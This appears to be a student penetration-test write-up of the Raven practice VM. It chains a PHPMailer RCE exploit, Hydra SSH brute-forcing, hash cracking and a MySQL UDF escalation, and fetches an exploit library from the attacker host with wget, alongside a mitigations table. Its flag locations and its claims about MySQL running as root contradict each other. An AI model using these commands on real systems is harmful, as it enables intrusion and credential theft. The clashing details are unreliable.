# 🔐 PenTest L5 E2 — Raven VM Full Penetration Test Report

> **Author:** Mumtaz Mullick 
> **Target:** Raven Virtual Machine  
> **Engagement Type:** Authorised White-Hat (CyberGuard Scenario)  
> **Methodology:** PTES (Penetration Testing Execution Standard)  
> **Environment:** Kali Linux → VMware NAT

---

## 📋 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Legal & Ethical Considerations](#legal--ethical-considerations)
3. [Methodology & Tools Used](#methodology--tools-used)
4. [Network Configuration & Verification](#network-configuration--verification)
5. [Phase 1 — Reconnaissance & Host Discovery](#phase-1--reconnaissance--host-discovery)
6. [Phase 2 — Port Scanning & Web Enumeration](#phase-2--port-scanning--web-enumeration)
7. [Phase 3 — Exploitation](#phase-3--exploitation)
8. [Phase 4 — Post-Exploitation & Data Exfiltration](#phase-4--post-exploitation--data-exfiltration)
9. [Phase 5 — Privilege Escalation to ROOT](#phase-5--privilege-escalation-to-root)
10. [Phase 5.1 — Persistence & Covering Tracks](#phase-51--persistence--covering-tracks)
11. [Vulnerability & Mitigation Summary](#vulnerability--mitigation-summary)
12. [Attack Chain Analysis](#attack-chain-analysis)
13. [Captured Flags Summary](#captured-flags-summary)
14. [Professional Reflection](#professional-reflection)

---

## Executive Summary

A full penetration test was conducted on the **"Raven"** virtual machine under the CyberGuard project. The primary objective was to systematically identify security vulnerabilities, demonstrate their impact through ethical exploitation, and provide clear mitigation strategies.

The system was found to be **severely misconfigured**, ultimately allowing **total system compromise**. A chain of vulnerabilities — starting with sensitive information leakage in hidden directories, moving through weak credentials, and culminating in a MySQL UDF privilege escalation — resulted in the recovery of all **four sensitive security flags** and full **root access**.

---

## Legal & Ethical Considerations

- Conducted under the **CyberGuard** authorised white-hat engagement scenario.
- All activities restricted to the provided virtual environment.
- Compliant with the **Computer Misuse Act 1990** (Section 1: Unauthorised Access).
- Followed the principle of **non-maleficence** — no permanent damage caused.
- Post-assessment cleanup performed: backdoor removed, sudoers reverted.

---

## Methodology & Tools Used

| Phase | Tool | Purpose |
|---|---|---|
| Reconnaissance | `netdiscover` | ARP-based host discovery |
| Reconnaissance | `nmap` | Port scanning, service detection, NSE scripts |
| Enumeration | `GoBuster` | Directory brute-forcing |
| Enumeration | `WPScan` | WordPress vulnerability & user enumeration |
| Enumeration | `Searchsploit` | Exploit-DB CLI for CVE research |
| Exploitation | `Metasploit Framework` | Automated payload delivery |
| Exploitation | `Python` | Custom exploit scripts & TTY stabilisation |
| Exploitation | `Netcat (nc)` | Reverse shell listener |
| Credential Attack | `Hydra` | SSH brute-force dictionary attack |
| Credential Attack | `John the Ripper` | Offline hash cracking |
| Post-Exploitation | `MySQL Client` | Database enumeration & UDF injection |

---

## Network Configuration & Verification

Both VMs were configured with **VMware NAT (VMnet8)** to ensure seamless connectivity.

| Screenshot | Description |
|---|---|
| **Screenshot 1** | Kali Linux → Network Adapter → NAT setting in VMware |
![alt text](<screenshot/screenshot 1.png>)
| **Screenshot 2** | PenTest L5 E2 VM → Network Adapter → NAT setting in VMware |
![alt text](<screenshot/screenshot 2.png>)
| **Screenshot 3** | VMware Virtual Network Editor → VMnet8 → NAT → Subnet: `192.168.209.0` |
![alt text](<screenshot/screenshot 3.png>)

> **Subnet:** `192.168.209.0/24` | **Attacker IP:** `192.168.209.132` | **Target IP:** `192.168.209.135`


---

## Phase 1 — Reconnaissance & Host Discovery

### Step 1: Identify Attacker IP

Used `ip addr` to confirm the Kali attacking machine's IP address.

| Screenshot | Description |
|---|---|
| **Screenshot 4** | Output of `ip addr` confirming attacker IP as `192.168.209.132/24` |
![alt text](<screenshot/screenshot 4.png>)

### Step 2: Network Scan for Target Discovery

Used `netdiscover -r 192.168.209.0/24` to perform ARP-based host discovery. Target **"Raven"** identified at `192.168.209.135`.

| Screenshot | Description |
|---|---|
| **Screenshot 5** | `netdiscover` output identifying target VM at `192.168.209.135` |
![alt text](<screenshot/screenshot 5.png>)
---

## Phase 2 — Port Scanning & Web Enumeration

### Step 1: Port Scanning & Service Identification (Nmap)

```
nmap -sV -sC -A -T4 192.168.209.135
```

**Open Ports Discovered:**

| Port | Service | Version |
|---|---|---|
| 80 | HTTP | Apache 2.4.10 (Primary attack vector) |
| 22 | SSH | OpenSSH 6.7p1 |
| 111 | RPC | rpcbind 2-4 |

| Screenshot | Description |
|---|---|
| **Screenshot 6** | Nmap scan results showing open ports and service versions on `192.168.209.135` |
![alt text](<screenshot/screenshot 6.png>)

### Step 2: Web Enumeration — Hidden Directory Discovery (GoBuster)

```
gobuster dir -u http://192.168.209.135 -w /usr/share/wordlists/dirb/common.txt
```

**Critical directories discovered:** `/vendor/` and `/wordpress/`

| Screenshot | Description |
|---|---|
| **Screenshot 7** | Firefox browser displaying the target web page at `http://192.168.209.135` |
![alt text](<screenshot/screenshot 7.png>)

| **Screenshot 8** | GoBuster output revealing hidden directories `/vendor/` and `/wordpress/` |

![alt text](<screenshot/screenshot 8.png>)

### Step 3: Third-Party Library Investigation — Information Leakage

| Screenshot | Description |
|---|---|
| **Screenshot 9** | Browser view of `http://192.168.209.135/vendor/` showing directory listing misconfiguration |
![alt text](<screenshot/screenshot 9.png>)

### Step 4: Specific Version Identification

> **Finding:** PHPMailer **5.2.16** — vulnerable to **CVE-2016-10033** (Remote Code Execution)

| Screenshot | Description |
|---|---|
| **Screenshot 10** | Browser displaying PHPMailer version `5.2.16` from the `/vendor/VERSION` file |
![alt text](<screenshot/screenshot 10.png>)

### Step 5: Vulnerability Research via Searchsploit

```
searchsploit phpmailer
```

| Screenshot | Description |
|---|---|
| **Screenshot 11** | Searchsploit results listing available exploits for PHPMailer, including CVE-2016-10033 |
![alt text](<screenshot/screenshot 11.png>)

### Step 6: WordPress User Enumeration (WPScan)

```
wpscan --url http://192.168.209.135/wordpress -e u
```

**Findings:** Usernames: **Steven** and **Michael** | WordPress: **4.8.7** | XML-RPC: **Enabled**

| Screenshot | Description |
|---|---|
| **Screenshot 12** | WPScan output showing WordPress version and enumeration progress |
![alt text](<screenshot/screenshot 12.png>)

| **Screenshot 12.1** | WPScan results confirming valid usernames: `michael` and `steven` |
![alt text](<screenshot/screenshot 12.1.png>)

### Step 7: Attack Vector Identification

| Screenshot | Description |
|---|---|
| **Screenshot 13** | Browser view of `contact.php` — the identified PHPMailer RCE attack vector |
![alt text](<screenshot/screenshot 13.png>)
---

## Phase 3 — Exploitation

### Step 1: Exploit Preparation

```
searchsploit -m 40974.py
```

| Screenshot | Description |
|---|---|
| **Screenshot 14** | Terminal showing `searchsploit -m 40974.py` copying the exploit to the working directory |
![alt text](<screenshot/screenshot 14.png>)

### Step 2 & 3: Exploit Customisation

| Line | Original | Updated |
|---|---|---|
| 41 (Target URL) | `http://localhost:8080` | `http://192.168.209.135/contact.php` |
| 44 (Attacker IP) | `192.168.0.12` | `192.168.209.132` |

| Screenshot | Description |
|---|---|
| **Screenshot 15** | Mousepad text editor showing the exploit script `40974.py` opened for editing |
![alt text](<screenshot/screenshot 15.png>)

| **Screenshot 16** | Mousepad showing the updated target URL and attacker IP in the exploit script |
![alt text](<screenshot/screenshot 16.png>)

### Step 4: Listener Configuration

```
nc -lvnp 4444
```

| Screenshot | Description |
|---|---|
| **Screenshot 17** | Terminal showing Netcat listener active on port `4444`, ready to catch the reverse shell |
![alt text](<screenshot/screenshot 17.png>)

### Step 4.1 & 4.2: Dependency Installation

```
pip3 install requests-toolbelt --break-system-packages
```

| Screenshot | Description |
|---|---|
| **Screenshot 18** | Terminal showing the `externally-managed-environment` error during pip install |
![alt text](<screenshot/screenshot 18.png>)

| **Screenshot 19** | Terminal confirming successful installation of `requests-toolbelt` with the bypass flag |
![alt text](<screenshot/screenshot 19.png>)

### Step 5: PHPMailer Exploit Execution

| Screenshot | Description |
|---|---|
| **Screenshot 20** | Terminal output of `40974.py` showing successful exploit execution against `contact.php` |
![alt text](<screenshot/screenshot 20.png>)

### Step 6: Automated Exploitation via Metasploit

| Screenshot | Description |
|---|---|
| **Screenshot 21** | Metasploit Framework console (`msfconsole`) launched and ready |
![alt text](<screenshot/screenshot 21.png>)

| **Screenshot 22** | Metasploit module `phpmailer_arg_injection` configured with RHOSTS and TARGETURI |
![alt text](<screenshot/screenshot 22.png>)

### Step 7: Exploit Troubleshooting & Strategic Pivot

| Screenshot | Description |
|---|---|
| **Screenshot 23** | Firefox showing `404 Not Found` when attempting to trigger the Metasploit backdoor |
![alt text](<screenshot/screenshot 23.png>)

| **Screenshot 24** | Metasploit terminal after pivoting strategy to credential-based SSH attack |
![alt text](<screenshot/screenshot 24.png>)

### Step 8: Credential Brute-Forcing via Hydra

```
hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.209.135 -t 4
```

> **Result:** Credentials recovered — `michael : michael`

| Screenshot | Description |
|---|---|
| **Screenshot 25** | Terminal showing `gunzip` decompressing the `rockyou.txt` wordlist |
![alt text](<screenshot/screenshot 25.png>)

| **Screenshot 26** | Hydra output confirming successful SSH credential recovery: `michael:michael` |
![alt text](<screenshot/screenshot 26.png>)
---

## Phase 4 — Post-Exploitation & Data Exfiltration

### Step 1: Initial Access via SSH

```
ssh michael@192.168.209.135
```

| Screenshot | Description |
|---|---|
| **Screenshot 27** | Terminal showing successful SSH login to Raven as user `michael` |
![alt text](<screenshot/screenshot 27.png>)

### Step 2: Post-Exploitation Enumeration

| Screenshot | Description |
|---|---|
| **Screenshot 28** | SSH session showing directory listing of `/var/www/html` post-exploitation |
![alt text](<screenshot/screenshot 28.png>)

### Step 3: Filesystem Traversal — Flag 2

```
find / -name "flag*" 2>/dev/null
cat /var/www/flag2.txt
```

| Screenshot | Description |
|---|---|
| **Screenshot 29** | Terminal output of `find` command locating all flag files across the filesystem |
![alt text](<screenshot/screenshot 29.png>)

| **Screenshot 30** | Terminal showing contents of `/var/www/flag2.txt` — Flag 2 retrieved |
![alt text](<screenshot/screenshot 30.png>)

> 🚩 **Flag 2:** `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`

### Step 4: Database Enumeration — Flags 3 & 4

```
select post_title, post_content from wp_posts;
```

| Screenshot | Description |
|---|---|
| **Screenshot 31** | MySQL prompt showing output of `show databases;` |
![alt text](<screenshot/screenshot 31.png>)

| **Screenshot 32** | MySQL prompt after executing `use wordpress;` |
![alt text](<screenshot/screenshot 32.png>)

| **Screenshot 33** | MySQL output of `show tables;` mapping the WordPress database structure |
![alt text](<screenshot/screenshot 33.png>)

| **Screenshot 34** | MySQL query results from `wp_posts` revealing Flag 3 and Flag 4 |
![alt text](<screenshot/screenshot 34.png>)


> 🚩 **Flag 3:** `flag3{afc01ab56b50591e7dccf93122770cd2}`  
> 🚩 **Flag 4:** `flag4{715dea6c055b9fe3337544932f2941ce}`

### Step 5: Security-Doc Folder Investigation

| Screenshot | Description |
|---|---|
| **Screenshot 35** | Terminal listing contents of the `Security - Doc` folder — no additional flags found |
![alt text](<screenshot/screenshot 35.png>)

### Step 6: Finding Flag 1

```
grep -r "flag1" /var/www/html
```

| Screenshot | Description |
|---|---|
| **Screenshot 36** | Terminal output of `grep` revealing Flag 1 hidden in HTML comments of `service.html` |
![alt text](<screenshot/screenshot 36.png>)

> 🚩 **Flag 1:** `flag1{b9bbcb33e11b80be759c4e844862482d}`

### Step 7: Privilege Escalation Assessment

| Screenshot | Description |
|---|---|
| **Screenshot 37** | Terminal showing `sudo -l` access denied for user `michael` |
![alt text](<screenshot/screenshot 37.png>)

| **Screenshot 38** | Terminal output of SUID binary audit — no directly exploitable binaries found |
![alt text](<screenshot/screenshot 38.png>)

### Step 8: Credential Harvesting from wp-config.php

> **Critical Finding:** MySQL root credentials — `root : R@v3nSecurity`

| Screenshot | Description |
|---|---|
| **Screenshot 39** | Terminal showing MySQL root credentials extracted from `wp-config.php` |
![alt text](<screenshot/screenshot 39.png>)

### Step 9: Credential Reuse Testing

| Screenshot | Description |
|---|---|
| **Screenshot 40** | Terminal showing `su root` authentication failure — password reuse mitigated |
![alt text](<screenshot/screenshot 40.png>)

### Step 10: MySQL Database Access

| Screenshot | Description |
|---|---|
| **Screenshot 41** | Terminal showing successful MySQL login using harvested root credentials |
![alt text](<screenshot/screenshot 41.png>)

### Step 11: Database Escape Attempt

| Screenshot | Description |
|---|---|
| **Screenshot 42** | MySQL prompt showing `\! whoami` output as `michael` — service not running as root |
![alt text](<screenshot/screenshot 42.png>)

### Step 12: Analysing Michael's Mail

| Screenshot | Description |
|---|---|
| **Screenshot 43** | Terminal showing internal mail spool for `michael` with cron job error logs |
![alt text](<screenshot/screenshot 43.png>)

| **Screenshot 43.1** | Continued mail output confirming recurring `service: not found` error from root cron job |
![alt text](<screenshot/screenshot 43.1.png>)

### Step 13.1: WordPress Credential Extraction

| Screenshot | Description |
|---|---|
| **Screenshot 44** | MySQL prompt showing successful authentication for credential extraction |
![alt text](<screenshot/screenshot 44.png>)

| **Screenshot 45** | MySQL output of `wp_users` table showing password hashes for `michael` and `steven` |
![alt text](<screenshot/screenshot 45.png>)

### Step 14: Hash Cracking with John the Ripper

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

> **Result:** `steven : pink84`

| Screenshot | Description |
|---|---|
| **Screenshot 46** | Terminal showing `hashes.txt` created with extracted WordPress password hashes |
![alt text](<screenshot/screenshot 46.png>)

| **Screenshot 47** | John the Ripper output confirming password recovery for `steven`: `pink84` |
![alt text](<screenshot/screenshot 47.png>)
---

## Phase 5 — Privilege Escalation to ROOT

### Step 1: UDF Exploit Research

| Screenshot | Description |
|---|---|
| **Screenshot 48** | MySQL output showing plugin directory path `/usr/lib/mysql/plugin/` |
![alt text](<screenshot/screenshot 48.png>)

| **Screenshot 49** | Terminal showing `find` command returning no results for `lib_mysqludf_sys.so` |
![alt text](<screenshot/screenshot 49.png>)

### Step 2: Path Hijacking Identification

| Screenshot | Description |
|---|---|
| **Screenshot 50** | Terminal showing `/usr/local/bin` directory permissions as `drwxrwsr-x` |
![alt text](<screenshot/screenshot 50.png>)

### Step 3: User Permission Validation

| Screenshot | Description |
|---|---|
| **Screenshot 51** | Terminal output of `id` confirming `michael` is not in the `staff` group |
![alt text](<screenshot/screenshot 51.png>)

### Step 4: Exploit Staging — HTTP Server on Kali

```
python3 -m http.server 80
```

| Screenshot | Description |
|---|---|
| **Screenshot 52** | Terminal showing Python HTTP server started on Kali to host the UDF exploit library |
![alt text](<screenshot/screenshot 52.png>)

### Step 4.1: Download Exploit Library to Target

```
wget http://192.168.209.132/lib_mysqludf_sys_64.so -O /tmp/lib_mysqludf_sys.so
```

| Screenshot | Description |
|---|---|
| **Screenshot 53** | SSH terminal showing `wget` successfully downloading the UDF library to `/tmp/` on Raven |
![alt text](<screenshot/screenshot 53.png>)

### Step 5: MySQL UDF Injection

> **Return value `0`** confirmed successful execution — `michael` added to the `sudo` group.

| Screenshot | Description |
|---|---|
| **Screenshot 54** | MySQL prompt showing the UDF library being loaded and written to the plugin directory |
![alt text](<screenshot/screenshot 54.png>)

| **Screenshot 55** | MySQL output confirming `sys_exec` function creation and successful `usermod` execution |
![alt text](<screenshot/screenshot 55.png>)

### Step 6: Final System Takeover

```
sudo su
whoami
```

> **Output: `root`** — Full System Compromise achieved! ✅

| Screenshot | Description |
|---|---|
| **Screenshot 56** | Terminal showing `sudo su` executed successfully, escalating to root |
![alt text](<screenshot/screenshot 56.png>)

| **Screenshot 57** | Terminal showing `whoami` output as `root` — full administrative access confirmed |
![alt text](<screenshot/screenshot 57.png>)

### Step 6.1: Root Directory Access Validation

| Screenshot | Description |
|---|---|
| **Screenshot 58** | Terminal showing `ls -la /root` output — root directory contents accessible |
![alt text](<screenshot/screenshot 58.png>)

### Step 7: Final Flag Exfiltration

| Screenshot | Description |
|---|---|
| **Screenshot 59** | Terminal showing `cat /root/flag4.txt` output with the final flag and congratulations message |
![alt text](<screenshot/screenshot 59.png>)


> 🚩 **Flag 4 (Root):** `flag4{715dea6c055b9fe3337544932f2941ce}`

---

## Phase 5.1 — Persistence & Covering Tracks

- **Persistence vectors identified:** SSH credentials (`michael:michael`) and PHP backdoor
- **Post-assessment cleanup:** `backdoor.php` removed, `/etc/sudoers` reverted, logs audited

---

## Vulnerability & Mitigation Summary

| Vulnerability | Severity | Recommended Mitigation |
|---|---|---|
| Information Disclosure (Flag 1 in HTML comments) | 🟡 Low | Strip developer comments from production code via build pipeline |
| Directory Indexing Enabled (`/vendor/` exposed) | 🟠 Medium | Disable directory listing in Apache config (`Options -Indexes`) |
| Outdated Software (PHPMailer 5.2.16 — CVE-2016-10033) | 🔴 Critical | Implement rigorous patch management for all third-party libraries |
| Weak Authentication (`michael:michael`) | 🟥 High | Enforce complex passwords; use SSH public-key authentication only |
| MySQL Running as Root (UDF Privilege Escalation) | 🔴 Critical | Apply Principle of Least Privilege — run services under low-privilege accounts |

---

## Attack Chain Analysis

```
netdiscover → nmap → GoBuster → /vendor/ → PHPMailer 5.2.16
     ↓
CVE-2016-10033 (RCE) → 404 Error (hardened permissions) → PIVOT
     ↓
WPScan (usernames) → Hydra brute-force → SSH access (michael:michael)
     ↓
wp-config.php → MySQL root credentials (R@v3nSecurity)
     ↓
MySQL UDF Injection → sys_exec → usermod → sudo su → ROOT ✅
```

> **Key Insight:** Total compromise was achieved by chaining several minor misconfigurations — not one single flaw.

---

## Captured Flags Summary

| Flag | Value | Location |
|---|---|---|
| 🚩 Flag 1 | `flag1{b9bbcb33e11b80be759c4e844862482d}` | Hidden in HTML comments of `service.html` |
| 🚩 Flag 2 | `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}` | `/var/www/flag2.txt` |
| 🚩 Flag 3 | `flag3{afc01ab56b50591e7dccf93122770cd2}` | WordPress database (`wp_posts` table) |
| 🚩 Flag 4 | `flag4{715dea6c055b9fe3337544932f2941ce}` | `/root/flag4.txt` (Root directory) |

---

## Professional Reflection

This assessment revealed a **high-risk vulnerability chain** rather than an isolated flaw. The ultimate failure was the **violation of the Principle of Least Privilege** — running MySQL as `root` allowed a database-level breach to escalate into a full system takeover. Ethical hacking provides the holistic proof-of-concept needed for organisations to prioritise security budget toward high-impact fixes like patch management and service-level isolation.

---

*Report prepared by Mumtaz Mullick | PenTest L5 E2 Assessment | CyberGuard Engagement*
